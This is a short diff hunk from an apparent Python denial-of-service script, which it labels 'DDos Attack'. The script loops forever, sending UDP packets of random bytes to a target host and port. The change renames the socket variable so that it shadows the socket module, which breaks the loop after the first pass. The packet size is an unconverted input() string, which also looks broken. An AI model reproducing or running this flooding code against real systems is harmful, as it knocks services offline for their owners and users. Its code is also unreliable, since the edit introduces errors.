@@ -13,9 +13,9 @@ packetes = input("Bytes :")
 #Multiples IPS
 while True:
 #packet
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(packetes)
-sock.sendto(bytes, (target_host, target_port))
+socket.sendto(bytes, (target_host, target_port))
 os.system("clear")
 os.system("figlet DDos Attack")
 #conexion_client
